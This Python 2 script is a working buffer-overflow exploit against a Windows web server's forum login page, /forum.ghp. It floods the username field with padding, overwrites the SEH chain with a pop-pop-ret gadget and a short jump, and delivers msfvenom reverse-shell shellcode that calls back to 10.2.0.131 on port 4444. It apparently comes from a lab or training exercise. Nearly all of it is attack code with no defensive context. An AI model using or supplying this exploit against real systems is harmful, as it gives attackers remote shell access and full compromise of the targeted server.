import socket
import sys

if len(sys.argv) < 3:
    print 'Usage: python {name} address port'.format(name = sys.argv[0])
    exit(1)

target_address = sys.argv[1]
target_port = sys.argv[2]

# EIP overwrite
# -------------
# 1001CBA9   5E               POP ESI
# 1001CBAA   5D               POP EBP
# 1001CBAB   C3               RETN

# Bad chars
# ---------
# \x00\x0a\x0d\x25\x2b

buffer =  '\x41' * 4059
buffer += '\xeb\x06'         # jmp short 0x6
buffer += '\x90\x90'         # nop nop
buffer += '\xa9\xcb\x01\x10' # pop-pop-ret

# Payload space ~430 bytes

# Generated using: msfvenom -p windows/shell_reverse_tcp LHOST=10.2.0.131 LPORT=4444 EXITFUNC=thread -b '\x00\x0a\x0d\x25\x2b' -f python -v payload
payload =  ""
payload += "\xba\x7e\x9b\x70\xd5\xdb\xd5\xd9\x74\x24\xf4\x5e"
payload += "\x31\xc9\xb1\x52\x31\x56\x12\x03\x56\x12\x83\x90"
payload += "\x67\x92\x20\x90\x70\xd1\xcb\x68\x81\xb6\x42\x8d"
payload += "\xb0\xf6\x31\xc6\xe3\xc6\x32\x8a\x0f\xac\x17\x3e"
payload += "\x9b\xc0\xbf\x31\x2c\x6e\xe6\x7c\xad\xc3\xda\x1f"
payload += "\x2d\x1e\x0f\xff\x0c\xd1\x42\xfe\x49\x0c\xae\x52"
payload += "\x01\x5a\x1d\x42\x26\x16\x9e\xe9\x74\xb6\xa6\x0e"
payload += "\xcc\xb9\x87\x81\x46\xe0\x07\x20\x8a\x98\x01\x3a"
payload += "\xcf\xa5\xd8\xb1\x3b\x51\xdb\x13\x72\x9a\x70\x5a"
payload += "\xba\x69\x88\x9b\x7d\x92\xff\xd5\x7d\x2f\xf8\x22"
payload += "\xff\xeb\x8d\xb0\xa7\x78\x35\x1c\x59\xac\xa0\xd7"
payload += "\x55\x19\xa6\xbf\x79\x9c\x6b\xb4\x86\x15\x8a\x1a"
payload += "\x0f\x6d\xa9\xbe\x4b\x35\xd0\xe7\x31\x98\xed\xf7"
payload += "\x99\x45\x48\x7c\x37\x91\xe1\xdf\x50\x56\xc8\xdf"
payload += "\xa0\xf0\x5b\xac\x92\x5f\xf0\x3a\x9f\x28\xde\xbd"
payload += "\xe0\x02\xa6\x51\x1f\xad\xd7\x78\xe4\xf9\x87\x12"
payload += "\xcd\x81\x43\xe2\xf2\x57\xc3\xb2\x5c\x08\xa4\x62"
payload += "\x1d\xf8\x4c\x68\x92\x27\x6c\x93\x78\x40\x07\x6e"
payload += "\xeb\x65\xda\x70\x68\x11\xd8\x70\x7f\xbe\x55\x96"
payload += "\x15\x2e\x30\x01\x82\xd7\x19\xd9\x33\x17\xb4\xa4"
payload += "\x74\x93\x3b\x59\x3a\x54\x31\x49\xab\x94\x0c\x33"
payload += "\x7a\xaa\xba\x5b\xe0\x39\x21\x9b\x6f\x22\xfe\xcc"
payload += "\x38\x94\xf7\x98\xd4\x8f\xa1\xbe\x24\x49\x89\x7a"
payload += "\xf3\xaa\x14\x83\x76\x96\x32\x93\x4e\x17\x7f\xc7"
payload += "\x1e\x4e\x29\xb1\xd8\x38\x9b\x6b\xb3\x97\x75\xfb"
payload += "\x42\xd4\x45\x7d\x4b\x31\x30\x61\xfa\xec\x05\x9e"
payload += "\x33\x79\x82\xe7\x29\x19\x6d\x32\xea\x39\x8c\x96"
payload += "\x07\xd2\x09\x73\xaa\xbf\xa9\xae\xe9\xb9\x29\x5a"
payload += "\x92\x3d\x31\x2f\x97\x7a\xf5\xdc\xe5\x13\x90\xe2"
payload += "\x5a\x13\xb1"

buffer += '\x90' * (4500 - len(buffer) - len(payload))
buffer += payload

request =  'POST /forum.ghp HTTP/1.1\r\n'
request += 'Host: {target}:{port}\r\n'.format(target = target_address, port = target_port)
request += 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0\r\n'
request += 'Referer: http://{target}:{port}/\r\n'.format(target = target_address, port = target_port)
request += 'Content-Type: application/x-www-form-urlencoded\r\n'
request += 'Content-Length: 56\r\n'
request += 'Cookie: UserID=a; PassWD=a; frmUserName=; frmUserPass=; rememberPass=202%2C197%2C208%2C215%2C201\r\n\r\n'
request += 'frmLogin=true&frmUserName=' + buffer + '&frmUserPass=a&login=Login%21'

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((target_address, int(target_port)))
s.send(request)
s.close()
